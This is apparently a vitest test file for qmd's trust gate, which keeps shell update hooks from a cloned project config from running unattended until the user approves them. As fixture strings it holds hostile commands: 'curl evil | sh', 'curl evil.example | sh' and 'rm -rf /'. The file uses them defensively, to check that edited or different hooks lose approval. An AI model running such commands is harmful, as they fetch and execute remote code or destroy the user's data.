/**
 * Trust gate for project-local `update:` hooks (#886).
 *
 * A `.qmd/index.yml` arrives with a `git clone`, so the shell commands it
 * declares must not run unattended just because someone typed `qmd update`.
 */

import { describe, test, expect, beforeEach, afterEach } from "vitest";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { mkdtempSync, rmSync, mkdirSync, writeFileSync, existsSync, readFileSync } from "node:fs";
import {
  decideHookGate,
  getTrustFilePath,
  hookDigest,
  isLocalConfigPath,
  isTrusted,
  listTrusted,
  loadTrustStore,
  recordTrust,
  revokeTrust,
  type UpdateHook,
} from "../src/trust.js";

let configDir: string;
const origConfigDir = process.env.QMD_CONFIG_DIR;

beforeEach(() => {
  configDir = mkdtempSync(join(tmpdir(), "qmd-trust-cfg-"));
  process.env.QMD_CONFIG_DIR = configDir;
});

afterEach(() => {
  if (origConfigDir !== undefined) process.env.QMD_CONFIG_DIR = origConfigDir;
  else delete process.env.QMD_CONFIG_DIR;
  try { rmSync(configDir, { recursive: true, force: true }); } catch { /* ignore */ }
});

/** A `.qmd/index.yml` path inside a throwaway project directory. */
function localConfigPath(): string {
  const project = mkdtempSync(join(tmpdir(), "qmd-trust-proj-"));
  mkdirSync(join(project, ".qmd"), { recursive: true });
  return join(project, ".qmd", "index.yml");
}

const hooks: UpdateHook[] = [{ collection: "docs", command: "git pull --ff-only" }];

describe("isLocalConfigPath", () => {
  test("recognizes a project-local config", () => {
    expect(isLocalConfigPath("/home/me/project/.qmd/index.yml")).toBe(true);
    expect(isLocalConfigPath("/home/me/project/.qmd/index.yaml")).toBe(true);
  });

  test("does not treat the user's own config as project-local", () => {
    expect(isLocalConfigPath("/home/me/.config/qmd/index.yml")).toBe(false);
    expect(isLocalConfigPath("/home/me/.config/qmd/work.yml")).toBe(false);
  });

  test("handles the SDK inline sentinel and empty paths", () => {
    expect(isLocalConfigPath("<inline>")).toBe(false);
    expect(isLocalConfigPath("")).toBe(false);
  });
});

describe("hookDigest", () => {
  test("is stable across collection ordering", () => {
    const a: UpdateHook[] = [
      { collection: "docs", command: "git pull" },
      { collection: "notes", command: "make sync" },
    ];
    const b: UpdateHook[] = [
      { collection: "notes", command: "make sync" },
      { collection: "docs", command: "git pull" },
    ];
    expect(hookDigest(a)).toBe(hookDigest(b));
  });

  test("changes when a command is edited", () => {
    expect(hookDigest([{ collection: "docs", command: "git pull" }]))
      .not.toBe(hookDigest([{ collection: "docs", command: "git pull && curl evil | sh" }]));
  });

  test("changes when another collection gains a hook", () => {
    expect(hookDigest(hooks)).not.toBe(hookDigest([...hooks, { collection: "notes", command: "true" }]));
  });
});

describe("trust store", () => {
  test("records, reads back and revokes", () => {
    const configPath = localConfigPath();
    const digest = hookDigest(hooks);

    expect(isTrusted(configPath, digest)).toBe(false);
    recordTrust(configPath, digest);
    expect(isTrusted(configPath, digest)).toBe(true);
    expect(listTrusted().map(r => r.path)).toContain(configPath);

    expect(revokeTrust(configPath)).toBe(true);
    expect(isTrusted(configPath, digest)).toBe(false);
    expect(revokeTrust(configPath)).toBe(false);
  });

  test("an approval does not cover a different hook set", () => {
    const configPath = localConfigPath();
    recordTrust(configPath, hookDigest(hooks));
    expect(isTrusted(configPath, hookDigest([{ collection: "docs", command: "rm -rf /" }]))).toBe(false);
  });

  test("an approval does not carry to another project", () => {
    const digest = hookDigest(hooks);
    recordTrust(localConfigPath(), digest);
    expect(isTrusted(localConfigPath(), digest)).toBe(false);
  });

  test("a corrupt trust file is not read as blanket trust", () => {
    mkdirSync(configDir, { recursive: true });
    writeFileSync(getTrustFilePath(), "{ not json", "utf-8");
    expect(loadTrustStore()).toEqual({});
    expect(isTrusted(localConfigPath(), hookDigest(hooks))).toBe(false);
  });

  test("writes the trust file into the config directory", () => {
    recordTrust(localConfigPath(), hookDigest(hooks));
    expect(existsSync(join(configDir, "trusted.json"))).toBe(true);
    expect(JSON.parse(readFileSync(join(configDir, "trusted.json"), "utf-8"))).toBeTypeOf("object");
  });
});

describe("decideHookGate", () => {
  const project = "/home/me/project/.qmd/index.yml";
  const global = "/home/me/.config/qmd/index.yml";
  const noEnv = {} as NodeJS.ProcessEnv;
  const untrusted = () => false;

  test("a config with no hooks needs no decision", () => {
    const decision = decideHookGate({ configPath: project, hooks: [], isInteractive: false, env: noEnv, trustedCheck: untrusted });
    expect(decision.action).toBe("run");
  });

  test("the user's own config always runs", () => {
    const decision = decideHookGate({ configPath: global, hooks, isInteractive: false, env: noEnv, trustedCheck: untrusted });
    expect(decision.action).toBe("run");
  });

  test("an untrusted project config prompts on a terminal", () => {
    const decision = decideHookGate({ configPath: project, hooks, isInteractive: true, env: noEnv, trustedCheck: untrusted });
    expect(decision.action).toBe("prompt");
  });

  test("an untrusted project config is skipped with nobody to ask", () => {
    const decision = decideHookGate({ configPath: project, hooks, isInteractive: false, env: noEnv, trustedCheck: untrusted });
    expect(decision.action).toBe("skip");
  });

  test("a previously approved hook set runs unattended", () => {
    const decision = decideHookGate({
      configPath: project,
      hooks,
      isInteractive: false,
      env: noEnv,
      trustedCheck: (path, digest) => path === project && digest === hookDigest(hooks),
    });
    expect(decision.action).toBe("run");
  });

  test("editing an approved command re-arms the gate", () => {
    const approvedDigest = hookDigest(hooks);
    const decision = decideHookGate({
      configPath: project,
      hooks: [{ collection: "docs", command: "git pull && curl evil.example | sh" }],
      isInteractive: false,
      env: noEnv,
      trustedCheck: (_path, digest) => digest === approvedDigest,
    });
    expect(decision.action).toBe("skip");
  });

  test("QMD_TRUST_UPDATE_HOOKS opts unattended runs back in", () => {
    const decision = decideHookGate({
      configPath: project,
      hooks,
      isInteractive: false,
      env: { QMD_TRUST_UPDATE_HOOKS: "1" } as NodeJS.ProcessEnv,
      trustedCheck: untrusted,
    });
    expect(decision.action).toBe("run");
  });

  test.each(["0", "false", "off", "no", ""])("QMD_TRUST_UPDATE_HOOKS=%o does not opt in", (value) => {
    const decision = decideHookGate({
      configPath: project,
      hooks,
      isInteractive: false,
      env: { QMD_TRUST_UPDATE_HOOKS: value } as NodeJS.ProcessEnv,
      trustedCheck: untrusted,
    });
    expect(decision.action).toBe("skip");
  });
});
